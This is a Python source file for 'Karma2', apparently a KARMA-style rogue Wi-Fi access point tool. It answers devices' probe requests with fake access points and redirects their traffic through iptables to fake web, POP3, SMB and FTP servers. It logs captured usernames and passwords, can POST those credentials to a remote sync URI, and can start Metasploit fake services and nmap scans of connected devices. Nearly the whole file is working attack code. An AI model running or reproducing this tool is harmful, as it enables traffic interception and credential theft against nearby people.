#!/usr/bin/env python
import os
from threading import Lock,Thread
import time,re,tempfile
import subprocess
from scapy.all import *
import argparse
import urllib2
import signal
import string

CERTFILE='./cert.pem'
KEYFILE='./key.pem'

import sys
sys.path.insert(0,"./impacket/")

from src.SambaCrawler import *
from src.POP3Server import *
from src.FTPServer import *
from src.SMBServer import *
from src.Webserver import *
from src.AccessPoint import *
from src.AdminWebserver import *
from src.Utils import *
from src.Database import ClientsDatabase
from src.ServiceGuessr import ServiceGuessr

#CERTFILE='./certs/fullchain.pem'
#KEYFILE='./certs/privkey.pem'
#FAKE_SSL_DOMAIN="test.domai"


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-g", "--gateway", help="Choose the router IP address. Example: -g 192.168.0.1")
    parser.add_argument("-m", "--monitor", help="Choose the monitor interface")
    parser.add_argument("-e", "--enable", help="Choose the monitor interface to enable")
    parser.add_argument("-a", "--hostapds", help="List of interfaces which will be used to create aps")
    parser.add_argument("-n", "--name", action="append", help="start this given essid with optional bssid ie myWifi,00:27:22:35:07:70")
    parser.add_argument("-f", "--metasploit", help="path to the metasploit console")
    parser.add_argument("-t", "--tcpdump", action='store_true', help="run tcpdump on interface")
    parser.add_argument("-o", "--offline", action='store_true', help="offline mode")
    parser.add_argument("-r", "--redirections", help="List of redirections (default is 80:8080,443:8080")
    parser.add_argument("-s", "--scan", action='store_true', help="run nmap on each new device")
    parser.add_argument("-x", "--management", help="deploy a management AP on this interface")
    parser.add_argument("-d", "--debug", action='store_true', help="debug mode")
    parser.add_argument("-u", "--uri", help="wifiScanMap sync uri")
    parser.add_argument("-b", "--forbidden", help="list of forBidden essid")
    parser.add_argument("-l", "--logpath", help="log path")
    parser.add_argument("-q", "--test", action='store_true', help="run test mode")
    return parser.parse_args()

log_lock = Lock()
logfile = None
def log(message):
  with log_lock:
    message="%s  %s"%(time.strftime("%H:%M:%S"), message)
    print message
    if logfile is not None:
      message="%s  %s"%(time.strftime("%Y-%m-%d %H:%M:%S"), message)
      logfile.write("%s\n"%message)
      logfile.flush()

class Karma2:

  def __init__(self, args):
    self.logpath = args.logpath
    if not os.path.exists(self.logpath):
      os.mkdir(self.logpath)
    
    
    self.ifmon = args.monitor
    self.ifgw = args.gateway
    self.ifhostapds = WLANInterfaces(args.hostapds)
    self.aps = {}
    self.subnets = set(xrange(50,256)) 
    self.clear_iptables()
    self.offline = args.offline
    self.tcpdump = args.tcpdump
    self.scan = args.scan
    self.debug = args.debug
    self.uri = args.uri
    self.locals_interfaces = self.getWirelessInterfacesList()
    self.forbidden_aps = args.forbidden
    self.KEYFILE = KEYFILE
    self.CERTFILE = CERTFILE

    self.redirections = {}

    if not args.offline:
      self.setup_nat(ifgw)
    else:
      self.redirections[110] = 8110
      self.redirections[445] = 8445
      self.redirections[21] = 8021

    self.redirections[80] = 8080
    self.redirections[443] = 8081

    if args.redirections is not None:
      r = args.redirections.split(',')
      for re in r:
        sport, dport = re.split(':')
        self.redirections[int(sport)] = int(dport)
        
    if args.metasploit is not None:
      self.start_metasploit(args.metasploit)
  
    self.db = ClientsDatabase(self)
    self.db.start()

    self.guessr = ServiceGuessr(self)

  def log_login(self, client, user):
    client_ap = self.get_client_ap(client)
    bssid = None
    if client_ap is None:
      client_ap = ''
      bssid = self.get_client_bssid(client)
    else:
      client_ap = client_ap.get_essid()
    
    log('%s %s login: %s, password: %s, uri: %s'%(ctxt('[*]', RED), ctxt(client_ap, GREEN), ctxt(user['login'], RED), ctxt(user['password'], RED), ctxt(user['uri'], RED)))
    if bssid is not None:
      user['bssid'] = bssid
      self.update_login({'login':user})
    
    self.db.new_client_credentials(user['login'], user['password'], user['uri'], bssid)

  def log(self, message):
    log(message)
  
  def get_client_ap(self,ip):
    for essid,ap in self.aps.iteritems():
      for m,c in ap.clients.iteritems():
        if c == ip:
          return ap

  def get_client_bssid(self, ip):
    for essid,ap in self.aps.iteritems():
      for m,c in ap.clients.iteritems():
        if c == ip:
          return m
  
  def getMacFromIface(self, _iface):
      path = "/sys/class/net/%s/address"%_iface
      data = open(path,'r').read()
      data = data[0:-1] # remove EOL
      return data
  
  def update_login(self, login):
    if self.uri is None:
      return
    try:
      req = urllib2.Request('%s/users.json'%self.uri)
      req.add_header('Content-Type', 'application/json')
      response = urllib2.urlopen(req, json.dumps(login, ensure_ascii=False))
    except:
      log( "could not update login")
  
  def update_dns(self, dns):
    if 'bssid' in dns and 'host' in dns:
      self.guessr.feed_dns_request(dns['bssid'], dns['host'])
      self.db.new_service_request(dns['bssid'], 'DNS', dns['qtype'], dns['host'], '', '', True)

    if self.uri is None:
      return
    try:
      req = urllib2.Request('%s/users.json'%self.uri)
      req.add_header('Content-Type', 'application/json')
      response = urllib2.urlopen(req, json.dumps(dns, ensure_ascii=False))
    except:
      log( "could not update dns")
  
  def start_metasploit(self, console):
    log( "[+] Starting metasploit")
    cmd = [console,'-r', 'run_fake_services.rb']
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE)

  def clear_iptables(self):
    log( "[+] Clearing iptables rules")
    cmd = ['iptables','-F']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

    cmd = ['iptables','-t','nat','-F']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

  def setup_nat(self, iface):
    log( "[+] Setting up NAT on %s"%iface)
    cmd = ["iptables", 
      "-t","nat",
      "-A","POSTROUTING",
      "-o",iface,
      "-j","MASQUERADE"]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

  def get_unique_subnet(self):
    a = self.subnets.pop()
    return IPSubnet("10.0.%d.%%d"%a)

  def free_subnet(self, subnet):
    self.subnets.add(subnet.base)

  def register_ap(self, essid, ap):
    self.aps[essid] = ap

  def release_ap(self, essid):
    self.aps.pop(essid)

  def create_mgmt_ap(self, iface):
    essid = "mgmt"
    ap = AccessPoint(self, 
      WLANInterface(iface),
      essid, None, 365*24*3600,
      wpa2="glopglopglop",
      fishing=False)
    ap.daemon = True
    ap.start()

  def create_aps(self, essids, bssids, timeout=30):
    while True:
      # fetch one interface
      iface = self.ifhostapds.get_one()
      if iface is None:
        break

      # get aps for this ap
      n = iface.available_ap
      messids = essids[:n]
      essids = essids[n:]

      mbssids = bssids[:n]
      bssids = bssids[n:]
      if messids == []:
        break

      self.create_ap(iface, messids, mbssids, timeout)

  def create_ap(self, iface, essid, bssid=None, timeout=30):
    if iface is None:
      return
    if iface.available_ap >= len(essid):
      ap = AccessPoint(self, iface, essid, bssid, timeout)
      for e in essid:
        self.register_ap(e,ap)
      ap.daemon = True
      ap.start()
    else:
      log("Too many ap %s to create for this interface %s"%(len(essid), iface.str()))

  def process_probe(self, essid, bssid = None):
    if (not essid in self.aps.keys()
            and not essid in self.forbidden_aps):
            iface = self.ifhostapds.get_one()
            self.create_ap(iface, [essid], [bssid])
  
  def getWirelessInterfacesList(self):
    networkInterfaces=[]		
    command = ["iwconfig"]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()
    (stdoutdata, stderrdata) = process.communicate();
    output = stdoutdata
    lines = output.splitlines()
    for line in lines:
      if(line.find("IEEE 802.11")!=-1):
        networkInterfaces.append(line.split()[0])
    return networkInterfaces
  
  def do_sniff(self):
    if self.ifmon is not None and 'http' in self.ifmon:
      while True:
        try:
          req = urllib2.Request("%s/status.json"%self.ifmon)
          f = urllib2.urlopen(req)
          data = f.read()
          j =  json.loads(data)
          for p in j['current']['probes']:
            bssid = None
            try:
              bssid = p['ap'][0][0]
            except:
              pass
            found = False
            for w in j['current']['wifis']:
              if p['essid'] == w['essid']:
                found = True
                break
            if not found:
              if not p['bssid'] in self.locals_interfaces:
                self.process_probe(p['essid'], bssid)
        except Exception as e:
          log( "Probes %s"%e)
        time.sleep(0.5)
    else:
      def _filter(packet):
        if packet.haslayer(Dot11ProbeReq):
          section = packet[Dot11ProbeReq][Dot11Elt]
          # SSID
          if section.ID == 0 and section.info != '':
            self.process_probe(section.info)
      
      sniff(prn=_filter,store=0)

  def start_adminserver(self, km, port):
    aserver = AdminWebserver(km, port)
    aserver.start()

  def start_webserver(self, km, port, ssl_port):
    ws = Webserver(km, port)
    ws.start()
    wss = SSLWebserver(km, ssl_port)
    wss.start()

  def start_mailserver(self, km, pop3_port):
    pop = POP3Server(km,pop3_port)
    pop.start()

  def start_smbserver(self, km, smb_port):
    smb = SMBServer(km, smb_port)
    smb.start()

  def start_ftpserver(self, km, ftp_port):
    ftp = FTPServer(km, ftp_port)
    ftp.start()

  def status(self, signum, stack):
    print ">>"
    for essid,ap in self.aps.iteritems():
      print "%s => %s (%s), inactive for %ss/%ss"%(ap.ifhostapd.iface, ap.essid, len(ap.clients), int((time.time() - ap.activity_ts)), ap.timeout)
      for mac,ip in ap.clients.iteritems():
        print "\t%s => %s"%(mac,ip)
    print "<<"

if __name__ == '__main__':


  from distutils.spawn import find_executable

  CHECK_EXECUTABLES = (
    'hostapd','nmap','iptables','tcpdump','dnsmasq','airmon-ng', 'smbclient',
  )

  # check for executables
  do_not_run = False
  for exe in CHECK_EXECUTABLES:
    if find_executable(exe) is None:
      log( "[x] %s does not seems to be installed (and needed)"%ctxt(exe, RED))
      do_not_run = True
  if do_not_run:
    sys.exit(-1)

  # parse command line
  args = parse_args()
  if args.enable is not None:
    cmd = ['airmon-ng','start',args.enable]
    p = subprocess.Popen(cmd,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE)

    log( "[+] Starting monitor mode on %s"%args.enable)
    p.wait()

    lines = p.stdout.read()
    m = re.match(r".*monitor mode enabled on (\w+).*", lines, re.S)
    if m is not None:
      iface, = m.groups()
      log( "[+] Monitor interface %s created"%iface)
      args.monitor = iface
      
  if args.logpath is None:
    args.logpath = './logs'
    if not os.path.exists(args.logpath):
      os.mkdir(args.logpath)
    #args.logpath = os.path.join(args.logpath,time.strftime("%Y-%m-%d_%H-%M-%S"))
    args.logpath = os.path.join(args.logpath,str(random.randint(0,1e16)))
    if not os.path.exists(args.logpath):
      os.mkdir(args.logpath)
    logfile = open(os.path.join(args.logpath, 'wifis.log'), 'w')
    
    sl = './logs/lastlog'
    if os.path.exists(sl) or os.path.islink(sl):
      os.unlink(sl)
    src = os.path.join(os.path.abspath(args.logpath), 'wifis.log')
    print src,sl
    os.symlink(src, sl)

  try:
    args.hostapds = args.hostapds.split(',')

    forbidden = ()
    if args.forbidden is not None:
     forbidden = args.forbidden.split(',')
    args.forbidden = forbidden
    
    km = Karma2(args)
    
    signal.signal(signal.SIGUSR1, km.status)
    signal.signal(signal.SIGUSR2, km.status)
    
    km.start_adminserver(km, 9999)
    
    if args.offline:
      km.start_webserver(km, km.redirections[80], km.redirections[443])
      km.start_mailserver(km, km.redirections[110])
      km.start_smbserver(km, km.redirections[445])
      km.start_ftpserver(km, km.redirections[21])

    if args.name is not None:
      essids = []
      bssids = []
      for name in args.name:
        # 24h timeout
        essids.append(name.split(',')[0])
        bssid = None
        try:
          bssid = name.split(',')[1]
        except:
          pass
        bssids.append(bssid)
        
      km.create_aps(essids, bssids, 60*60*24*365)
    
    if not args.test:
      km.do_sniff()

    while True:
      if args.test:
        char_set = string.ascii_uppercase + string.digits
        essid = ''.join(random.sample(char_set*6, 6))
        km.create_ap(self.ifhostapds.get_one(), "test_%s"%essid, None)
        
      time.sleep(1)

  except KeyboardInterrupt:
    pass
  finally:
    if logfile is not None:
      logfile.close()
    if args.enable is not None:
      log( "[+] Stopping monitor interface %s properly"%args.monitor)
      cmd = ['airmon-ng','stop',args.monitor]
      p = subprocess.Popen(cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)
      p.wait()

